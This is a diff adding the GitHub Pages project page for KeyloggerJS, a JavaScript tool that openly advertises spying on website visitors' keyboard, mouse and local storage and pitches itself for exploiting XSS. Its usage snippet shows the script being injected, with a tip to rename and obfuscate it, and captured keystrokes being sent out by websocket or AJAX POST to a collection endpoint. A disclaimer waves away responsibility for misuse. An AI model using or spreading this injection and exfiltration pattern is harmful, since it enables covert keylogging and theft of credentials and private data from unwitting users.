@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=640">
+
+    <link rel="stylesheet" href="stylesheets/core.css" media="screen">
+    <link rel="stylesheet" href="stylesheets/mobile.css" media="handheld, only screen and (max-device-width:640px)">
+    <link rel="stylesheet" href="stylesheets/pygment_trac.css">
+
+    <script type="text/javascript" src="javascripts/modernizr.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+    <script type="text/javascript" src="javascripts/headsmart.min.js"></script>
+    <script type="text/javascript">
+      $(document).ready(function () {
+        $('#main_content').headsmart()
+      })
+    </script>
+    <title>KeyloggerJS by yanisadoui</title>
+  </head>
+
+  <body>
+    <a id="forkme_banner" href="https://github.com/yanisadoui/keyloggerJS">View on GitHub</a>
+    <div class="shell">
+
+      <header>
+        <span class="ribbon-outer">
+          <span class="ribbon-inner">
+            <h1>KeyloggerJS</h1>
+            <h2>KeyloggerJS is a tool to spy the client (mouse, keyboard, local data, etc).</h2>
+          </span>
+          <span class="left-tail"></span>
+          <span class="right-tail"></span>
+        </span>
+      </header>
+
+      <section id="downloads">
+        <span class="inner">
+          <a href="https://github.com/yanisadoui/keyloggerJS/zipball/master" class="zip"><em>download</em> .ZIP</a><a href="https://github.com/yanisadoui/keyloggerJS/tarball/master" class="tgz"><em>download</em> .TGZ</a>
+        </span>
+      </section>
+
+
+      <span class="banner-fix"></span>
+
+
+      <section id="main_content">
+        <h3>
+<a id="keyloggerjs-simply" class="anchor" href="#keyloggerjs-simply" aria-hidden="true"><span class="octicon octicon-link"></span></a>KeyloggerJS, simply.</h3>
+
+<ul>
+<li>Tired of having to code your own tools to exploit XSS ? </li>
+<li>Need to gather information on the interactions of your users ? </li>
+<li>Or for any reason, KeyloggerJS interests you ? </li>
+</ul>
+
+<p>KeyloggerJS is divided into modules. Of bases, the modules availables are <strong>http</strong>, <strong>dom</strong>, <strong>WebStorage</strong>, <strong>keylog</strong>, <strong>mouse</strong>, and everyone is free to propose new ones.</p>
+
+<h3>
+<a id="philosophy-use--political" class="anchor" href="#philosophy-use--political" aria-hidden="true"><span class="octicon octicon-link"></span></a>Philosophy, use &amp;&amp; political.</h3>
+
+<p>KeyloggerJS, its developers and contributors of all kinds are not responsible for the use made of distributed sources on Github. The internet is free, and we believe that everyone is mature enough to know what is good or not, what is acceptable or not.</p>
+
+<p>This tool is developed by passion above all, everyone is free to contribute (if he wants to bring something to the project).</p>
+
+<h3>
+<a id="documentation" class="anchor" href="#documentation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Documentation.</h3>
+
+<p>Documentation is available on <strong><a href="https://github.com/yanisadoui/keyloggerJS/wiki">Github wiki page</a></strong> !</p>
+
+<p>But, here a example of utilisation. First, include KeyloggerJS : </p>
+
+<pre><code>//# You can change filename and obfuscate the code.
+//# It is also possible to include dynamically from JavaScript (also obfuscated).
+//# But, basically :
+&lt;script src="http://localhost/js/keylog.js"&gt;&lt;/script&gt;
+</code></pre>
+
+<p>Next, run KeyloggerJS : <code>var keylog = new keylogger();</code></p>
+
+<pre><code>// Now, we load a module for starting listening !
+keylog.http(3000, function(data) {
+     // With websockets
+     var socket = io("http://localhost");
+     socket.emit("httpKeylog", data);
+
+    // With AJAX
+    var xhr = getXMLHttpRequest();
+    xhr.open("POST", "keylog.php");
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    xhr.send(JSON.stringify(data));
+});
+</code></pre>
+
+<h3>
+<a id="author" class="anchor" href="#author" aria-hidden="true"><span class="octicon octicon-link"></span></a>Author</h3>
+
+<p>This tool is maintained &amp;&amp; developed by <strong><a href="https://twitter.com/yanisadoui">Yanis Adoui</a></strong>.</p>
+      </section>
+
+      <footer>
+        <span class="ribbon-outer">
+          <span class="ribbon-inner">
+            <p>this project by <a href="https://github.com/yanisadoui">yanisadoui</a> can be found on <a href="https://github.com/yanisadoui/keyloggerJS">GitHub</a></p>
+          </span>
+          <span class="left-tail"></span>
+          <span class="right-tail"></span>
+        </span>
+        <p>Generated with <a href="http://pages.github.com">GitHub Pages</a> using Merlot</p>
+        <span class="octocat"></span>
+      </footer>
+
+    </div>
+
+    
+  </body>
+</html>
